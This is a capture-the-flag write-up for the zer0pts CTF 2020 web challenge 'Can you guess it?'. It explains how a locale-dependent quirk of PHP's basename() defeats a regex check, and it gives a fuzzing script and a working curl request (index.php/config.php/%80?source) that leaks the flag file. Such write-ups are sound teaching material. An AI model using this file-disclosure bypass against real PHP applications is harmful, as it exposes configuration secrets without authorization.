# [zer0pts CTF 2020] Can you guess it?
###### tags: `zer0pts CTF`, `zer0pts CTF 2020`, `web`

## Solution
We're given the source code (`index.php`) and `Dockerfile`. As you can see from `index.php`, you can get the flag if you can guess `bin2hex(random_bytes(64))` or get `config.php`.

```php=
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

Of course guessing `random_bytes(64)` is not realistic, so the goal is to read `config.php`. Also, bypassing `hash_equals` is impossible because if one of parameters is not string, `hash_equals` returns `FALSE`, so if you post `guess[]=test`, this app shows `Wrong`.

The remaining suspicious part is `highlight_file(basename($_SERVER['PHP_SELF']));`, which prints the source code itself. [`basename`](https://www.php.net/manual/en/function.basename.php) is a function that returns filename of given path, and [`$_SERVER['PHP_SELF']`](https://www.php.net/manual/en/reserved.variables.server.php) is a path of currently executing script.

But why this app checks if `$_SERVER['PHP_SELF']` ends with `config.php`? This is because if you access `/index.php/config.php`, `$_SERVER['PHP_SELF']` is `/index.php/config.php`. So, if there is no check, the server shows the content of `config.php`.

So, we need to bypass the check. Let's see the document of [`basename`](https://www.php.net/manual/en/function.basename.php) again.

> **Caution**
> `basename()` is locale aware, so for it to see the correct basename with multibyte character paths, the matching locale must be set using the `setlocale()` function.

What does it mean? Let's reproduce the environment with given `Dockerfile` and 
fuzz.

```
$ docker run --rm -it php:7.3-apache bash
︙
root@a06cc21f03e1:/tmp# apt install -y libicu-dev
root@a06cc21f03e1:/tmp# docker-php-ext-install intl
root@a06cc21f03e1:/tmp# cat test.php
<?php
function check($str) {
  return preg_match('/config\.php\/*$/i', $str);
}

for ($i = 0; $i < 0x100; $i++) {
  $s = '/index.php/config.php/' . IntlChar::chr($i);
  if (!check($s)) {
    $t = basename('/index.php/config.php/' . chr($i));
    echo "${i}: ${t}\n";
  }
}
root@a06cc21f03e1:/tmp# php test.php
︙
120: x
121: y
122: z
123: {
124: |
125: }
126: ~
127: ^?
128: config.php
129: config.php
130: config.php
131: config.php
132: config.php
︙
```

Wow, if `/(character out of ASCII range)` is appended, `basename` returns `config.php`.

Finally, you can get the flag by accessing `http://3.112.201.75:8003/index.php/config.php/%80?source`.

```
$ curl http://3.112.201.75:8003/index.php/config.php/%80?source
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />define</span><span style="color: #007700">(</span><span style="color: #DD0000">'FLAG'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}'</span><span style="color: #007700">);</span>
</span>
</code>
```